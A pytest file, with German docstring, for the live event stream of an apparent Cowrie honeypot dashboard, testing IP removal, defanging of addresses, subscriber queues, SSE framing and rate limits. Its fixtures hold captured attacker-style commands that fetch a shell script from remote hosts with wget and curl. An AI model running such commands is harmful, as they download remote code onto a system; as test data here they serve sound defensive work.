"""Prüft Meldungen, Verteiler und Ereignisfolge des Streams (ohne Datenbank).

Die Zusage aus dem Bauplan: Der Stream zeigt Live-Ereignisse ohne IPs. Die
Adresse des Angreifers darf nie darin stehen, auch nicht entschärft.
Adressen Dritter in Befehlen erscheinen nur entschärft (README „Harte Regeln“).
"""

from __future__ import annotations

import asyncio
import json
from datetime import datetime, timezone
from types import SimpleNamespace

import pytest

from app.events import normalize
from app.ratelimit import client_key
from app.stream import (
    PREVIEW_LENGTH,
    RETRY_MS,
    STREAM_EVENTS,
    Broadcaster,
    sse_data,
    sse_events,
    stream_message,
)

NOW = datetime(2026, 9, 18, 12, 0, tzinfo=timezone.utc)
ALLOWED_KEYS = {"ts", "variant", "country", "event", "command"}


def event(**fields):
    base = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-09-17T14:26:31.123456Z",
        "session": "0123456789ab",
        "sensor": "hp-a",
        "src_ip": "203.0.113.5",
        "dst_ip": "198.51.100.1",
        "input": "uname -a",
        "message": "CMD: uname -a",
    }
    base.update(fields)
    return normalize(base, now=NOW)


# --- Meldungen --------------------------------------------------------------


def test_a_command_becomes_a_small_message():
    message = stream_message(event(), "DE")
    assert message == {
        "ts": "2026-09-17T14:26:31Z",
        "variant": "a",
        "country": "DE",
        "event": "command",
        "command": "uname -a",
    }


def test_the_preview_is_at_most_80_characters():
    message = stream_message(event(input="echo " + "x" * 500), None)
    assert len(message["command"]) == PREVIEW_LENGTH
    assert message["command"].endswith("…")


def test_the_attacker_address_never_appears():
    message = stream_message(event(input="wget http://203.0.113.5/x.sh; curl 203.0.113.5"), "DE")
    as_text = json.dumps(message)
    assert "203.0.113.5" not in as_text
    assert "203[.]0[.]113[.]5" not in as_text


def test_third_party_addresses_appear_only_defanged():
    message = stream_message(event(input="wget http://45.9.148.99/x.sh"), "DE")
    assert message["command"] == "wget hxxp://45[.]9[.]148[.]99/x.sh"
    assert "45.9.148.99" not in json.dumps(message)


def test_nothing_that_identifies_a_session_is_sent():
    for eventid in STREAM_EVENTS:
        message = stream_message(event(eventid=eventid), "DE")
        assert set(message) <= ALLOWED_KEYS


def test_only_meaningful_events_are_streamed():
    for eventid in ("cowrie.client.kex", "cowrie.client.size", "cowrie.session.params", "cowrie.log.closed"):
        assert stream_message(event(eventid=eventid), "DE") is None


def test_only_commands_carry_a_preview():
    message = stream_message(event(eventid="cowrie.session.connect"), "DE")
    assert message["event"] == "connect"
    assert "command" not in message


# --- Verteiler --------------------------------------------------------------


def test_every_subscriber_gets_every_message():
    broadcaster = Broadcaster()
    first, second = broadcaster.subscribe(), broadcaster.subscribe()
    broadcaster.publish({"n": 1})
    assert first.get_nowait() == {"n": 1}
    assert second.get_nowait() == {"n": 1}


def test_a_slow_client_loses_the_oldest_messages():
    broadcaster = Broadcaster(queue_size=3)
    queue = broadcaster.subscribe()
    for n in range(5):
        broadcaster.publish({"n": n})
    assert [queue.get_nowait()["n"] for _ in range(3)] == [2, 3, 4]


def test_the_number_of_subscribers_is_limited():
    broadcaster = Broadcaster(max_subscribers=2)
    assert broadcaster.subscribe() is not None
    assert broadcaster.subscribe() is not None
    assert broadcaster.subscribe() is None


def test_a_client_that_leaves_gets_nothing_more():
    broadcaster = Broadcaster()
    queue = broadcaster.subscribe()
    broadcaster.unsubscribe(queue)
    broadcaster.publish({"n": 1})
    assert queue.empty()
    assert broadcaster.subscriber_count == 0


# --- Ereignisfolge ----------------------------------------------------------


def test_a_message_is_one_data_line():
    chunk = sse_data({"command": "echo 'a\nb'"})
    assert chunk.startswith("data: ") and chunk.endswith("\n\n")
    assert chunk.count("\n") == 2
    assert json.loads(chunk[len("data: "):]) == {"command": "echo 'a\nb'"}


def collect(queue, disconnect_after: int, heartbeat: float = 0.01) -> list[str]:
    calls = {"n": 0}

    async def is_disconnected() -> bool:
        calls["n"] += 1
        return calls["n"] > disconnect_after

    async def run():
        return [chunk async for chunk in sse_events(queue, is_disconnected, heartbeat=heartbeat)]

    return asyncio.run(run())


def test_the_stream_starts_with_a_retry_hint():
    chunks = collect(asyncio.Queue(), disconnect_after=0)
    assert chunks == [f"retry: {RETRY_MS}\n\n"]


def test_a_quiet_stream_sends_a_heartbeat():
    chunks = collect(asyncio.Queue(), disconnect_after=1)
    assert chunks[1] == ": ping\n\n"


def test_messages_are_passed_on():
    queue = asyncio.Queue()
    queue.put_nowait({"event": "connect"})
    chunks = collect(queue, disconnect_after=1)
    assert chunks[1] == 'data: {"event":"connect"}\n\n'


# --- Endpunkt ---------------------------------------------------------------


def key_for(address: str) -> str:
    return client_key(SimpleNamespace(headers={"x-forwarded-for": address}, client=None))


def test_too_many_streams_per_client_are_refused(app_client):
    limiter = app_client.app.state.limiter
    key = key_for("198.51.100.77")
    for _ in range(limiter.streams_per_client):
        assert limiter.acquire_stream(key)
    response = app_client.get("/stream", headers={"X-Forwarded-For": "198.51.100.77"})
    assert response.status_code == 429
    assert response.headers["Retry-After"] == "30"


def test_a_full_stream_says_so(app_client):
    app_client.app.state.broadcaster = Broadcaster(max_subscribers=0)
    response = app_client.get("/stream", headers={"X-Forwarded-For": "198.51.100.78"})
    assert response.status_code == 503
    # Der Platz im Limiter wurde wieder freigegeben.
    assert app_client.app.state.limiter.acquire_stream(key_for("198.51.100.78"))


@pytest.mark.parametrize("eventid", sorted(STREAM_EVENTS))
def test_every_streamed_event_has_a_name(eventid):
    assert STREAM_EVENTS[eventid].isidentifier()
